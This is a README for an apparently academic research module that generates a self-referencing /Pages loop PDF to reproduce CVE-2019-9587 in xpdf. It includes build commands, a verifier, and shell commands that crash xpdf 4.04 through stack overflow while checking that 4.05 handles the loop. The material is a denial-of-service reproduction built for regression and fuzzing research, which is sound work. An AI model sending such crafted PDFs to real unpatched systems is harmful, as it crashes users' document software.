# Page-Tree Loop Module

Structured page-tree object-loop grammar for the Xpdf CVE-2019-9587 path.

The serializer emits a minimal PDF whose catalog references a `/Pages` object
loop. The default message reproduces the exact two-object shape documented in
`research/pocs/cve-2019-9587`: object `2 0` is a `/Pages` node whose `/Kids`
array points back to `2 0 R` and whose `/Count` is zero, forcing
`Catalog::readPageTree()` to call `Catalog::countPageTree()`.

## Build

```sh
cd /home/parkle/master-thesis-research-logs/research/schema/pdf-proto
cmake -S . -B build-env-check-clang18 \
  -DCMAKE_CXX_COMPILER=/usr/bin/clang++-18 \
  -DCMAKE_C_COMPILER=/usr/bin/clang-18
cmake --build build-env-check-clang18 --target \
  verify_pagetree_loop pagetreeloop2pdf proto2pdf verify_serializer
```

## Verify

```sh
env ASAN_OPTIONS=detect_leaks=0 \
  ./build-env-check-clang18/verify_pagetree_loop \
  /home/parkle/master-thesis-research-logs/research/targets/xpdf/4.04/build-release/xpdf/pdftotext \
  /home/parkle/master-thesis-research-logs/research/targets/xpdf/4.04/build-asan/xpdf/pdftotext \
  /home/parkle/master-thesis-research-logs/research/targets/xpdf/4.05/build-asan/xpdf/pdftotext
```

The verifier checks:

- semantic round-trip: serialized PDF is parsed back into a canonical
  `PageTreeLoopDocument`;
- structural invariants after deserialization: loop shape, loop length, and
  `/Count` trigger mode;
- parser sanity: the internal parser must succeed, and `qpdf --check` must
  either accept the PDF or reject it with a meaningful loop diagnostic;
- content assertions: `/Type /Catalog`, `/Pages 2 0 R`, `/Type /Pages`,
  `/Kids`, and the expected `/Count` token must appear;
- optional xpdf smoke behavior: xpdf 4.04 release should crash, xpdf 4.04 ASan
  should report `Catalog::countPageTree` stack overflow, and xpdf 4.05 ASan
  should stop with `Loop in Pages tree`.

## Deterministic CVE-2019-9587 Seed

```sh
env ASAN_OPTIONS=detect_leaks=0 \
  ./build-env-check-clang18/pagetreeloop2pdf \
  modules/pagetreeloop/seeds/cve-2019-9587.txtpb \
  /tmp/cve-2019-9587-page-tree-loop.pdf

env ASAN_OPTIONS=detect_leaks=0 \
  ./build-env-check-clang18/proto2pdf \
  modules/pagetreeloop/seeds/cve-2019-9587-pdfdoc.txtpb \
  /tmp/cve-2019-9587-page-tree-loop-pdfdoc.pdf
```

Expected differential result:

```sh
RESEARCH=/home/parkle/master-thesis-research-logs/research

bash -lc 'ulimit -s 256; \
  "$RESEARCH/targets/xpdf/4.04/build-release/xpdf/pdftotext" \
  /tmp/cve-2019-9587-page-tree-loop.pdf /tmp/cve-2019-9587-release.txt'

bash -lc 'ulimit -s 256; \
  ASAN_OPTIONS=detect_leaks=0 \
  "$RESEARCH/targets/xpdf/4.04/build-asan/xpdf/pdftotext" \
  /tmp/cve-2019-9587-page-tree-loop.pdf /tmp/cve-2019-9587-asan.txt'

bash -lc 'ulimit -s 256; \
  ASAN_OPTIONS=detect_leaks=0 \
  "$RESEARCH/targets/xpdf/4.05/build-asan/xpdf/pdftotext" \
  /tmp/cve-2019-9587-page-tree-loop.pdf /tmp/cve-2019-9587-fixed.txt'
```

xpdf 4.04 release should segfault, xpdf 4.04 ASan should report a
`stack-overflow` involving `Catalog::countPageTree`, and xpdf 4.05 should stop
the loop without crashing.
